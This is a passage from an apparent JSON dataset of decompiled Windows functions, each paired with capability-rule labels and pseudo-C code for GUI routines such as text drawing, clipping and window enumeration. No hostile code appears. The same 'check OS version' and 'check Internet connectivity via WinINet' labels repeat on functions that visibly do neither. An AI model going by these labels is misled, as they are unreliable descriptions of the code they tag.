var_39h._1_1_ = var_8h;\n            var_39h._2_2_ = var_8h >> 8;\n            uStack57 = var_8h >> 0x18;\n            var_3dh._1_1_ = SUB41(&fcn.00431d34::var_2dh, 0);\n            var_3dh._2_2_ = &fcn.00431d34::var_2dh >> 8;\n            var_39h._0_1_ = &fcn.00431d34::var_2dh >> 0x18;\n            _auStack68 = 0x431dd8;\n            fcn.00412730(&fcn.00431d34::var_2dh, var_8h);\n            _auStack68 = 0x431de3;\n            cVar2 = fcn.00403454();\n            if (cVar2 == '\\0') {\n                _auStack68 = NULL;\n                uStackY72 = 8;\n                puStackY76 = &fcn.00431d34::var_2dh;\n                var_4ch = 0x431df4;\n                sub.user32.dll_OffsetRect();\n            }\n            else {\n                _auStack68 = NULL;\n                uStackY72 = (in_EAX[0x12] + -8) - CONCAT22(var_25h._2_2_, CONCAT11(var_25h._1_1_, var_25h));\n                puStackY76 = &fcn.00431d34::var_2dh;\n                var_4ch = 0x431e0b;\n                sub.user32.dll_OffsetRect();\n            }\n        }\n        var_2dh._0_1_ = 0;\n        (**(*in_EAX + 0x44))();\n        var_2dh._0_1_ = var_21h >> 0x18;\n        var_39h._1_1_ = var_29h;\n        var_39h._2_2_ = CONCAT22(var_29h._2_2_, CONCAT11(var_29h._1_1_, var_29h)) >> 8;\n        uStack57 = var_29h._2_2_ >> 8;\n        var_3dh._1_1_ = var_2dh;\n        var_3dh._2_2_ = CONCAT22(var_2dh._2_2_, CONCAT11(var_2dh._1_1_, var_2dh)) >> 8;\n        var_39h._0_1_ = var_2dh._2_2_ >> 8;\n        _auStack68 = 0x431e4f;\n        _auStack68 = fcn.0041d804();\n        uStackY72 = 0x431e55;\n        sub.gdi32.dll_ExcludeClipRect();\n        uStackY72 = 0x431e5c;\n        cVar2 = (**(*in_EAX + 0x50))();\n        if (cVar2 == '\\0') {\n            var_dh._0_1_ = 0x1c;\n        }\n        else {\n            var_dh._0_1_ = 0x1b;\n        }\n        var_1dh._1_1_ = 0x6f;\n        var_1dh._2_2_ = 0x431e;\n        var_19h = var_19h & 0xffffff00;\n        fcn.0042f140();\n        var_1dh._1_1_ = 0x7a;\n        var_1dh._2_2_ = 0x431e;\n        var_19h = var_19h & 0xffffff00;\n        fcn.0042f484();\n        var_1dh._1_1_ = SUB41(&fcn.00431d34::var_3dh, 0);\n        var_1dh._2_2_ = &fcn.00431d34::var_3dh >> 8;\n        var_19h = var_19h & 0xffffff00 | &fcn.00431d34::var_3dh >> 0x18;\n        var_1dh._0_1_ = 0;\n        var_25h._1_1_ = 0x87;\n        var_25h._2_2_ = 0x431e;\n        var_21h._1_3_ = 0;\n        var_21h._0_1_ = 0;\n        uVar3 = fcn.0041d804();\n        var_25h._1_1_ = uVar3;\n        var_25h._2_2_ = uVar3 >> 8;\n        var_21h._0_1_ = uVar3 >> 0x18;\n        var_29h._1_1_ = 0x8d;\n        var_29h._2_2_ = 0x431e;\n        var_25h._0_1_ = 0;\n        fcn.0042f140();\n        var_25h._1_1_ = 0x96;\n        var_25h._2_2_ = 0x431e;\n        var_21h._0_1_ = 0;\n        fcn.0042f32c(CONCAT13(var_1dh, var_21h._1_3_), CONCAT13(var_19h, CONCAT21(var_1dh._2_2_, var_1dh._1_1_)));\n        var_25h._1_1_ = 0;\n        var_25h._2_2_ = 0;\n        var_21h = var_21h._1_3_ << 8;\n        var_29h._1_1_ = 0x9f;\n        var_29h._2_2_ = 0x431e;\n        var_25h._0_1_ = 0;\n        uVar3 = fcn.0041d804();\n        var_39h._1_1_ = uVar3;\n        var_39h._2_2_ = uVar3 >> 8;\n        uStack57 = uVar3 >> 0x18;\n        var_2dh._1_1_ = 0xa5;\n        var_2dh._2_2_ = 0x431e;\n        var_29h._0_1_ = 0;\n        sub.gdi32.dll_SelectClipRgn();\n        var_2dh._1_1_ = 0xaf;\n        var_2dh._2_2_ = 0x431e;\n        var_29h._0_1_ = 0;\n        fcn.0043952c();\n        if (var_5ch != NULL) {\n            var_2dh._1_1_ = 0xc3;\n            var_2dh._2_2_ = 0x431e;\n            var_29h._0_1_ = 0;\n            fcn.0043952c();\n            var_2dh._1_1_ = 0xce;\n            var_2dh._2_2_ = 0x431e;\n            var_29h._0_1_ = 0;\n            fcn.004047d4();\n            var_2dh._1_1_ = var_60h;\n            var_2dh._2_2_ = var_60h >> 8;\n            var_29h._0_1_ = var_60h >> 0x18;\n            var_2dh._0_1_ = &fcn.00431d34::var_2dh >> 0x18;\n            arg_ch = 0;\n            var_39h._1_1_ = 0;\n            var_39h._2_2_ = 0;\n            uStack57 = 0;\n            var_3dh._1_1_ = 0xe1;\n            var_3dh._2_2_ = 0x431e;\n            var_39h._0_1_ = 0;\n            uVar3 = fcn.0041d804();\n            var_3dh._1_1_ = uVar3;\n            var_3dh._2_2_ = uVar3 >> 8;\n            var_39h._0_1_ = uVar3 >> 0x18;\n            _auStack68 = 0x431ee7;\n            fcn.0042f140();\n            var_3dh._1_1_ = 0xf0;\n            var_3dh._2_2_ = 0x431e;\n            var_39h._0_1_ = 0;\n            fcn.0042f420(CONCAT13(uStack57, CONCAT21(var_39h._2_2_, var_39h._1_1_)), arg_ch, \n                         &fcn.00431d34::var_2dh & 0xffffff | var_2dh << 0x18, \n                         CONCAT13(var_29h, CONCAT21(var_2dh._2_2_, var_2dh._1_1_)));\n        }\n    }\n    *in_FS_OFFSET = CONCAT13(uStack57, CONCAT21(var_39h._2_2_, var_39h._1_1_));\n    var_2dh._0_1_ = 0;\n    fcn.00403fcc();\n    fcn.00403fcc();\n    fcn.00404688();\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 5225
    },
    "00432260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00432297)\n// WARNING: Removing unreachable block (ram,0x004322a0)\n// WARNING: Removing unreachable block (ram,0x004322a8)\n\nvoid __fastcall fcn.00432260(uint32_t param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4323b6;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + 0x90))();\n    if ((param_1 & 0x400) != 0) {\n        fcn.00404270();\n    }\n    uVar2 = fcn.0043b800();\n    fcn.0041d724();\n    cVar1 = (**(*in_EAX + 0x50))();\n    if (cVar1 == '\\0') {\n        sub.user32.dll_OffsetRect(param_2, 1, 1);\n        fcn.0041c8f0();\n        uVar4 = param_2;\n        uVar3 = fcn.00404268(param_2, uVar2);\n        uVar3 = fcn.00404468(uVar3);\n        uVar3 = fcn.0041d804(uVar3);\n        sub.user32.dll_DrawTextA(uVar3);\n        sub.user32.dll_OffsetRect(param_2, 0xffffffff, 0xffffffff);\n        fcn.0041c8f0();\n        uVar2 = fcn.00404268(param_2, uVar2);\n        uVar2 = fcn.00404468(uVar2);\n        uVar2 = fcn.0041d804(uVar2);\n        sub.user32.dll_DrawTextA(uVar2);\n    }\n    else {\n        uVar2 = fcn.00404268(param_2, uVar2);\n        uVar2 = fcn.00404468(uVar2);\n        uVar4 = fcn.0041d804(uVar2);\n        sub.user32.dll_DrawTextA();\n    }\n    *in_FS_OFFSET = uVar4;\n    fcn.00403fa8(0x4323bd);\n    return;\n}\n",
        "token_count": 558
    },
    "00432718": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432718(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4327a5;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (in_EAX[0x5a] != 0) {\n        cVar2 = (**(*in_EAX + 0x50))();\n        if ((cVar2 != '\\0') && (*(in_EAX + 0x5c) != '\\0')) {\n            fcn.0043952c();\n            cVar2 = fcn.00450650();\n            if (cVar2 != '\\0') {\n                piVar1 = in_EAX[0x5a];\n                cVar2 = fcn.00403454();\n                if (cVar2 != '\\0') {\n                    (**(*piVar1 + 0xc4))();\n                    *(param_2 + 0xc) = 1;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4327ac;\n    uStack28 = 0x4327a4;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 341
    },
    "004328bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004328bc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0043ba34();\n    if ((*(*0x462210 + 0xc) != '\\0') && (**0x462204 == 2)) {\n        *(in_EAX + 0x184) = 0;\n    }\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 179
    },
    "00432a78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432a78(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0043cb94();\n    if (*(in_EAX + 0x209) != '\\0') {\n        *(param_2 + 4) = *(param_2 + 4) | 0x2000;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00432e94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432e94(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(*(arg_8h + -4) + 0x30) != 0) && (iVar2 = fcn.0043ca38(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.0043c9fc();\n            if ((piVar3 != *(arg_8h + -4)) && (cVar1 = fcn.004033e4(),  cVar1 != '\\0')) {\n                iVar4 = (**(*piVar3 + 0x3c))();\n                if (iVar4 != 0) {\n                    (**(*piVar3 + 0x3c))();\n                    cVar1 = fcn.004033e4();\n                    if ((cVar1 != '\\0') && (iVar4 = (**(*piVar3 + 0x3c))(),  *(iVar4 + 0x95) != '\\0')) {\n                        (**(*piVar3 + 0x3c))();\n                        fcn.00445cf8();\n                    }\n                }\n                (**(*piVar3 + 0xcc))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 330
    },
    "00432f50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432f50(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t *var_4h;\n    \n    if (param_2 != *(in_EAX + 0x211)) {\n        *(in_EAX + 0x211) = param_2;\n        fcn.0043ff3c();\n        cVar1 = fcn.0044000c();\n        var_4h = in_EAX;\n        if (cVar1 != '\\0') {\n            uVar2 = (**(*in_EAX + 200))(0);\n            var_4h = uVar2 & 0x7f;\n            uVar3 = fcn.0043fd08(0xf1);\n            sub.user32.dll_SendMessageA(uVar3);\n        }\n        if (param_2 != '\\0') {\n            fcn.00432e94(&stack0xfffffffc);\n            fcn.00439138();\n            if (*(var_4h + 0x82) == '\\0') {\n                fcn.00403454();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 272
    },
    "004338b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004338b4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43390c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*0x463afc != NULL) {\n        fcn.00433468();\n        (**(**0x463afc + 0x10))();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x433913;\n    uStack28 = 0x43390b;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 173
    },
    "0043391c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043391c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack296;\n    uint uStack292;\n    uchar *puStack288;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    puStack288 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack292 = 0x433a12;\n    uStack296 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed8;\n    var_108h._0_1_ = 0xb;\n    var_10ch = param_2;\n    fcn.00408c78(0, &fcn.0043391c::var_10ch);\n    fcn.00433468();\n    uVar2 = 0x433982;\n    cVar1 = fcn.00433dac();\n    if (cVar1 != '\\0') {\n        uVar2 = 0;\n        fcn.00404218();\n        cVar1 = fcn.00433d04(uVar2);\n        if ((cVar1 != '\\0') && (var_4h != 0)) {\n            *(in_EAX + 0x10) = 1;\n            fcn.00404218();\n            uVar2 = fcn.00404468(0x102, &fcn.0043391c::var_104h);\n            uVar2 = (**(**(in_EAX + 0x1c) + 0xc))(uVar2);\n            sub.user32.dll_WinHelpA();\n        }\n    }\n    *in_FS_OFFSET = uVar2;\n    fcn.00403fa8(0x433a19);\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 446
    },
    "00433a30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00433a30(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x433a92;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (*0x463afc != NULL) {\n        fcn.00433468();\n        (**(**0x463afc + 0x14))();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x433a99;\n    uStack32 = 0x433a91;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 180
    },
    "00433aa4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00433aed)\n\nvoid __fastcall fcn.00433aa4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x433b24;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00433468();\n    uVar2 = 0x433ad3;\n    cVar1 = fcn.00433dac();\n    if (cVar1 != '\\0') {\n        fcn.00433d04(param_2);\n        uVar2 = param_2;\n    }\n    *in_FS_OFFSET = uVar2;\n    uStack28 = 0x433b2b;\n    uStack32 = 0x433b23;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 243
    },
    "00433574": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00433574(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4335db;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*0x463afc != NULL) {\n        fcn.00433468();\n        (**(**0x463afc + 0xc))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4335e2;\n    uStack24 = 0x4335da;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 173
    },
    "004335ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004335ec(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x433674;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (*0x463afc == NULL) {\n        piVar1 = fcn.00403228();\n        fcn.00433560();\n        fcn.00404328(param_2, 0x43368c, 0);\n        (**(*piVar1 + 0x38))();\n    }\n    else {\n        puStack28 = &stack0xfffffffc;\n        (**(**0x463afc + 0x18))();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x43367b;\n    uStack32 = 0x433673;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 257
    },
    "00433694": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004336d9)\n\nvoid fcn.00433694(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x43370f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    cVar1 = fcn.00433dac();\n    if (cVar1 != '\\0') {\n        *(in_EAX + 0x10) = 2;\n        (**(**(in_EAX + 0x1c) + 0x10))();\n        fcn.00433468();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x433716;\n    uStack24 = 0x43370e;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 242
    },
    "0043371c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004337bd)\n\nvoid __fastcall fcn.0043371c(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint *arg_8h;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x433814;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puVar1 = &stack0xfffffffc;\n    if (param_2 == 0) {\n        fcn.0040b5f4();\n        fcn.004039e4();\n        puVar1 = puStack44;\n    }\n    puStack44 = puVar1;\n    arg_8h = &fcn.0043371c::var_4h;\n    fcn.00433468();\n    fcn.00408cb8(arg_8h);\n    uVar3 = 0x433795;\n    cVar2 = fcn.00433dac();\n    if (cVar2 != '\\0') {\n        fcn.00433468();\n        uVar3 = 0;\n        fcn.00433d04(0);\n    }\n    *in_FS_OFFSET = uVar3;\n    uStack52 = 0x43381b;\n    fcn.00403fa8();\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 401
    },
    "00433468": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00433468(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x43351d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.00403fa8();\n    if ((param_2 == 0) && (*(in_EAX + 0x1c) != 0)) {\n        (**(**(in_EAX + 0x1c) + 0x10))();\n    }\n    else {\n        fcn.00404040();\n    }\n    if (*0x463afc != NULL) {\n        (**(**0x463afc + 0x20))();\n    }\n    if (*0x463afc != NULL) {\n        (**(**0x463afc + 0x1c))();\n        puStack28 = NULL;\n        uStack32 = 0x433534;\n        uStack36 = 0;\n        fcn.00404328();\n    }\n    fcn.00403ffc();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x433524;\n    uStack32 = 0x43351c;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 331
    },
    "00433538": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00433538(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00433868();\n    if (*(in_EAX + 0x1c) != 0) {\n        (**(**(in_EAX + 0x1c) + 0x14))();\n        fcn.00405648();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00433d04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00433d04(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack40 = 0x433d1b;\n    fcn.00404458();\n    uStack44 = 0x433d7a;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00433ce8();\n    if ((((var_ch != '\\0') && (in_DL == *(in_EAX + 0x10))) && (in_DL != '\\0')) && (in_DL == '\\x01')) {\n        fcn.00407bac();\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x433d81;\n    uStack44 = 0x433d79;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 263
    },
    "00433dac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00433dac(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar auStack24 [4];\n    uint uStack20;\n    char cStack12;\n    \n    uVar3 = 0;\n    fcn.00433ce8();\n    if (cStack12 != '\\0') {\n        uVar2 = sub.user32.dll_GetWindowThreadProcessId(uStack20, 0, fcn.00433c90, auStack24);\n        sub.user32.dll_EnumThreadWindows(uVar2);\n    }\n    cVar1 = fcn.00433d8c();\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00433d90();\n        if (cVar1 != '\\0') {\n            fcn.00433e08();\n        }\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 203
    },
    "00433e08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00433e54)\n\nvoid fcn.00433e08(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x433e85;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00433868();\n    iVar1 = sub.kernel32.dll_GetTickCount();\n    do {\n        uStack28 = 0;\n        sub.kernel32.dll_Sleep();\n        iVar2 = sub.kernel32.dll_GetTickCount();\n    } while (iVar2 - iVar1 < 0x3e9);\n    fcn.00433468();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x433e8c;\n    uStack24 = 0x433e84;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 244
    },
    "00433f08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00433f08(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x433f76;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x463b04 = *0x463b04 + 1;\n    if (*0x463b04 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*(*0x463b08 + 0x1c) != 0) {\n            fcn.00433538();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00405648();\n        fcn.00405648();\n        fcn.00405648();\n        fcn.00403fa8();\n        fcn.00405648();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 238
    },
    "004422e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
